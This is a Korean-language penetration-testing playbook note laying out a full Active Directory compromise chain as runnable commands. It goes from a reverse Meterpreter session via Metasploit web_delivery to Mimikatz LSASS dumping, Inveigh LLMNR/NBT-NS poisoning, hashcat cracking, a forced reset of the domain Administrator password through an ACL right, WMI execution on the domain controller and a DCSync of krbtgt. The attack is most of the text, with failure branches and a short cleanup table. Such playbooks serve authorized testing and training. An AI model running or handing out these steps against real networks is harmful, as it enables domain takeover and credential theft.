---
tags:
  - 환경/windows
  - 환경/ad
  - 서비스/smb
  - 기능/권한상승
시작상태:
  - 도메인에 연결된 Windows 호스트에서 SYSTEM 명령 실행 가능
  - Linux 공격 호스트에서 대상 호스트의 reverse 연결 수신 가능
목표:
  - Windows 호스트의 재사용 가능한 AD 자격 증명 확보
  - LLMNR 또는 NBT-NS 인증에서 NetNTLMv2 hash 수집과 비밀번호 복구
  - 대상 AD 사용자 객체의 비밀번호 재설정과 관리자 자격 증명 확보
  - Domain Controller 원격 명령 실행과 DCSync
필요권한:
  - Windows 시작 호스트의 NT AUTHORITY\SYSTEM
  - LSASS 메모리 또는 LSA secret 읽기 권한
  - 대상 AD 사용자 객체의 비밀번호 재설정 권한
  - DCSync에 필요한 복제 권한
필요정보:
  - 도메인·DC와 다음 Windows 호스트
  - 공격 호스트 listener 주소와 포트
  - 제어 중인 AD 계정과 ACL 대상 객체
네트워크위치:
  - Linux 공격 호스트에서 시작 Windows 호스트와 도메인 내부 호스트에 직접 또는 피벗 경유 접근
---

# Linux에서 Windows Meterpreter를 사용한 AD 사용자 비밀번호 재설정과 DCSync

## 시나리오 개요

Windows 호스트의 SYSTEM 명령 실행에서 Meterpreter 세션을 열고 LSASS 또는 LSA secret에서 AD 자격 증명을 확보한다. 그 계정으로 다음 Windows 호스트에 로그인해 Inveigh로 NetNTLMv2 hash를 수집·크래킹한 뒤, 대상 AD 사용자 객체에 대한 비밀번호 재설정 권한을 확인한다. 해당 계정의 비밀번호를 변경해 DC에 WMI 명령을 실행하고 `krbtgt` 계정을 DCSync한다.

## 기준 구조

```text
Linux 공격 호스트
  <- reverse Meterpreter
Windows 시작 호스트 SYSTEM
  -> LSASS 또는 LSA secret에서 AD 자격 증명
    -> 다음 Windows 호스트 RDP
      -> Inveigh로 NetNTLMv2 hash 수집
        -> Hashcat으로 평문 비밀번호 복구
          -> 사용자 객체 제어권 확인과 비밀번호 변경
            -> 새 자격 증명으로 DC WMI 실행
              -> DCSync krbtgt
```

## 시작 상태

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 시작 호스트 권한 | SYSTEM 명령 실행 | `hostname & whoami` | [[PrintSpoofer로 SeImpersonatePrivilege 권한 상승]] 등 실제 고권한 확인 |
| reverse 경로 | 시작 호스트에서 handler 포트 연결 | 실제 세션 생성 | LHOST·LPORT·route·방화벽 확인 |
| 도메인 경로 | Windows 호스트에서 DC DNS·LDAP·Kerberos 접근 | `nltest`, `Test-NetConnection` | [[AD 도메인 컨텍스트 기본 확인]] |
| 다음 호스트 접근 | 확보할 계정으로 RDP 또는 다른 원격 로그온 가능 | 서비스별 인증 | [[확보한 자격 증명으로 원격 접근 경로 선택]] |
| AD 객체 제어권 | 현재 AD 계정이 사용자 또는 그룹 객체에 필요한 쓰기 권한 보유 | BloodHound와 ACL 재조회 | [[AD 객체 제어권 확보 후 악용 경로 선택]] |

## 공격 경로 요약

| 단계 | 실행 위치 | 수행할 행동 | 확인할 출력·상태 | 다음 단계 |
|---|---|---|---|---|
| 1 | Metasploit와 Windows SYSTEM 명령 채널 | [[Metasploit Web Delivery로 Meterpreter 세션 획득]] | SYSTEM Meterpreter 세션 | 도구 반입 |
| 2 | Meterpreter | [[Meterpreter upload로 Windows 파일 반입]] | 원격 Mimikatz 파일과 hash | LSASS 수집 |
| 3 | Windows SYSTEM 세션 또는 Linux 공격 호스트 | [[LSASS 메모리 덤프]] 또는 [[Windows LSA Secrets 추출]] | 계정명이 연결된 평문 비밀번호·NT hash | 원격 로그온 |
| 4 | Linux 공격 호스트 | [[RDP 로그인과 GUI 세션]] | 다음 Windows 호스트의 사용자 GUI 세션 | Inveigh 실행 |
| 5 | Windows 사용자 세션 | [[LLMNR NBT-NS 포이즈닝으로 NTLM 인증 수집]] | 사용자명과 NetNTLMv2 challenge-response | 오프라인 크래킹 |
| 6 | Linux 공격 호스트 | [[오프라인 해시 크래킹]] | NetNTLMv2 hash의 평문 비밀번호 | AD ACL 확인 |
| 7 | Windows 도메인 세션 | [[AD ACL 권한 열거와 공격 경로 식별]] | 대상 사용자 객체의 비밀번호 재설정 권한 | 비밀번호 변경 |
| 8 | Windows 도메인 세션 | [[AD 사용자 비밀번호 강제 재설정]] | 새 비밀번호로 인증 성공 | DC 원격 실행 |
| 9 | Linux 공격 호스트 | [[WMI 원격 명령 실행]] | DC의 원격 명령 출력과 실제 계정 | DCSync |
| 10 | Linux 공격 호스트 | [[DCSync]] | `krbtgt` NT hash·Kerberos key | 결과 확인 후 복구 |

## 1. SYSTEM 컨텍스트에서 Meterpreter 세션 획득

Linux 공격 호스트의 Metasploit에서 Web Delivery와 x64 Meterpreter reverse handler를 준비한다.

```text
msf6 > use exploit/multi/script/web_delivery
msf6 exploit(multi/script/web_delivery) > set target 2
msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set LHOST tun0
msf6 exploit(multi/script/web_delivery) > set LPORT 4444
msf6 exploit(multi/script/web_delivery) > set SRVHOST 0.0.0.0
msf6 exploit(multi/script/web_delivery) > run
```

SYSTEM 명령 실행 채널에서 Metasploit이 출력한 PowerShell launcher를 그대로 실행한다. PrintSpoofer 경유라면 출력된 launcher 전체를 `-c` 인수로 전달한다.

```text
msf6 > sessions -l
msf6 > sessions -i 1
meterpreter > getuid
meterpreter > sysinfo
```

예시의 세션 ID는 `1`이다. `sessions -l`에서 실제 생성된 ID를 확인해 선택하고, `Meterpreter session ... opened`와 `Server username: NT AUTHORITY\SYSTEM`을 확인한다.

## 2. Mimikatz 반입과 LSASS 자격 증명 확인
### Linux 공격 호스트와 Windows Meterpreter 명령 전환

`msf6 >` 프롬프트는 Linux 공격 호스트의 Metasploit 콘솔이다. `meterpreter >` 명령은 연결된 Windows 대상에서 실행되고, `lcd`만 Linux 공격 호스트의 로컬 디렉터리를 바꾼다. `upload`는 Linux의 현재 로컬 디렉터리에서 Windows 대상으로 파일을 전송한다.

```text
# Linux 공격 호스트의 msfconsole
msf6 > sessions -i 1

# Windows 대상의 Meterpreter
meterpreter > pwd
meterpreter > lcd /usr/share/windows-resources/mimikatz/x64
meterpreter > upload mimikatz.exe C:\Windows\Temp\mimikatz.exe
meterpreter > shell

# Windows 대상의 cmd.exe
C:\Windows\Temp> whoami
C:\Windows\Temp> exit

# Windows 대상의 Meterpreter
meterpreter > background

# Linux 공격 호스트의 msfconsole
msf6 > sessions -l
```

`shell` 뒤 `exit`는 Windows `cmd.exe`를 닫고 Meterpreter로 돌아간다. `background`는 세션을 끊지 않고 Linux의 `msfconsole` 프롬프트로 돌아간다.

```text
meterpreter > lcd /usr/share/windows-resources/mimikatz/x64
meterpreter > upload mimikatz.exe C:\Windows\Temp\mimikatz.exe
meterpreter > shell
C:\> C:\Windows\Temp\mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

`Privilege '20' OK`는 debug privilege 활성화, `Authentication Id`별 `Username`, `Domain`, `NTLM`, `Password`는 로그온 세션별 결과다. `(null)` 값과 실제 평문 비밀번호·NT hash를 구분한다.

원격 로컬 관리자 자격 증명을 이미 가지고 있다면 [[Windows LSA Secrets 추출]]의 NetExec 경로로 대체할 수 있다. 이 시나리오에서는 어느 경로를 사용하든 계정명이 연결된 평문 비밀번호 또는 재사용 가능한 NT hash를 확보한 상태에서 다음 단계로 간다.

`Dumping LSA Secrets` 뒤 `DOMAIN\user:password` 형태가 나오면 AutoLogon 등 계정명이 연결된 평문 secret이다. `$DCC2$`와 머신 계정 `plain_password_hex`는 같은 결과가 아니다.

## 3. 확보한 AD 자격 증명으로 다음 Windows 호스트 로그인

```bash
xfreerdp /v:<RDP_TARGET> /d:<DOMAIN> /u:<AD_USER> /dynamic-resolution /cert:ignore
```

비밀번호는 FreeRDP 프롬프트에 입력한다. GUI 세션이 열리면 `whoami`, `hostname`과 현재 그룹을 확인한다. RDP 로그인 성공은 로컬 관리자나 AD 객체 제어권을 뜻하지 않는다.

## 4. Inveigh로 NetNTLMv2 인증 수집

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

사용자명, 도메인, 출발지 IP와 `NTLMv2` challenge-response를 함께 기록한다. 요청이 없으면 같은 링크·이름 해석 프로토콜·방화벽·수신 인터페이스를 확인한다.

## 5. NetNTLMv2 hash 오프라인 크래킹

```bash
hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt --backend-ignore-opencl -d 1 -O -w 3
```

복구된 평문은 해당 hash에 표시된 사용자 계정의 비밀번호 후보이다. 새 서비스 인증으로 유효성과 계정 범위를 확인한다.

## 6. 대상 AD 사용자 객체의 비밀번호 재설정 권한 확인

BloodHound의 edge에서 주체와 대상 객체 유형을 확인한 뒤 PowerView로 대상 사용자 객체의 ACL을 재조회한다. 이 경로의 대상은 `Administrator` 계정이다.

```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid $env:USERNAME
Get-DomainObjectAcl -Identity Administrator -ResolveGUIDs |
  Where-Object {
    $_.SecurityIdentifier -eq $sid -and
    $_.ObjectAceType -eq 'User-Force-Change-Password'
  } |
  Select-Object ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier
```

`ObjectDN`이 `Administrator` **사용자 객체**이고 `ObjectAceType`이 `User-Force-Change-Password`여야 이 비밀번호 변경 경로를 사용한다. 그룹 객체의 `GenericAll`은 이 명령의 근거가 아니다.

## 7. 도메인 Administrator 비밀번호 변경

```cmd
net user Administrator * /domain
```

새 비밀번호를 두 번 입력한다. `*`를 사용하면 비밀번호를 명령줄과 shell history에 직접 남기지 않는다. `The command completed successfully.`가 출력되면 새 Administrator 자격 증명으로 다음 단계의 원격 인증을 시도한다.

## 8. 새 Administrator 자격 증명으로 DC WMI 명령 실행

```bash
impacket-wmiexec '<DOMAIN>/Administrator@<DC_IP>'
```

```cmd
C:\> hostname
C:\> whoami
```

비밀번호 프롬프트에 7단계에서 설정한 값을 입력한다. WMI 셸이 열리고 `hostname`, `whoami`가 DC의 예상 결과를 반환해야 한다.

## 9. DCSync로 krbtgt 자격 증명 확인

```bash
impacket-secretsdump '<DOMAIN>/Administrator@<DC_IP>' -just-dc-user krbtgt
```

비밀번호 프롬프트에 같은 값을 입력한다. `Dumping Domain Credentials` 뒤 `DOMAIN\krbtgt:RID:LM_HASH:NT_HASH:::` 형식이 출력되어야 한다. 445/TCP 연결 실패는 인증·복제 권한 전에 네트워크 경로부터 확인한다.

## 실패 시 분기

| 실패 지점·출력 | 먼저 확인할 것 | 다음 경로 |
|---|---|---|
| Meterpreter session 없음 | launcher 실행, handler bind·LHOST·LPORT | [[Metasploit Web Delivery로 Meterpreter 세션 획득]] |
| `sekurlsa::logonpasswords` access denied | SYSTEM·debug privilege, PPL·EDR | [[LSASS 메모리 덤프]] |
| RDP 로그인 거부 | 비밀번호 유효성, RDP 로그온 권한·NLA | [[확보한 자격 증명으로 원격 접근 경로 선택]] |
| Inveigh hash 없음 | 동일 링크, LLMNR·NBT-NS 요청, listener interface | [[LLMNR NBT-NS 포이즈닝으로 NTLM 인증 수집]] |
| Hashcat 미복구 | mode 5600, hash 형식, wordlist·rule | [[오프라인 해시 크래킹]] |
| `net user` access denied | ACL 대상이 실제 사용자 객체인지, `User-Force-Change-Password` 권한이 있는지 | [[AD ACL 권한 열거와 공격 경로 식별]] |
| 새 Administrator 자격 증명으로 WMI 거부 | 비밀번호 변경 성공 여부, 도메인 표기, DC 주소, WMI·SMB 경로 | [[WMI 원격 명령 실행]] |
| WMI 거부 | 새 로그온 계정의 유효성, 도메인 표기, DC 주소, WMI·SMB 경로 | [[WMI 원격 명령 실행]] |
| DCSync access denied | 같은 주체의 두 복제 권한, DC 경로·대상 도메인 | [[AD 계정의 디렉터리 복제 권한 확인]] |

## 변경 영향과 복구

| 변경 대상 | 복구 절차 |
|---|---|
| 반입한 Mimikatz·보조 파일 | 사용 완료 후 대상 저장 파일 삭제 |
| Inveigh listener와 출력 파일 | 작업 완료 후 listener 종료, 생성 파일 위치 확인 |
| 도메인 Administrator 비밀번호 | 기존 값을 알고 있거나 별도 관리 복구 경로가 있을 때 원래 상태로 되돌림 |
| 새 로그온·Kerberos ticket | 세션 종료와 필요 시 `klist purge` |

## 완료 기준

- LSASS·LSA·Inveigh 결과에서 계정과 자격 증명 유형을 구분했다.
- NetNTLMv2 hash를 mode 5600으로 크래킹하고 새 인증으로 평문 비밀번호를 확인했다.
- 대상 사용자 객체의 비밀번호 재설정 권한을 확인하고 Administrator 비밀번호를 변경했다.
- 새 Administrator 자격 증명으로 DC WMI 명령 실행과 `krbtgt` DCSync 출력을 확인했다.
- 수행한 AD 변경과 반입 파일·listener를 복구했다.

## 관련 도구

- [[metasploit]]
- [[meterpreter]]
- [[mimikatz]]
- [[Inveigh]]
- [[hashcat]]
- [[xfreerdp]]
- [[impacket-wmiexec]]
- [[impacket-secretsdump]]
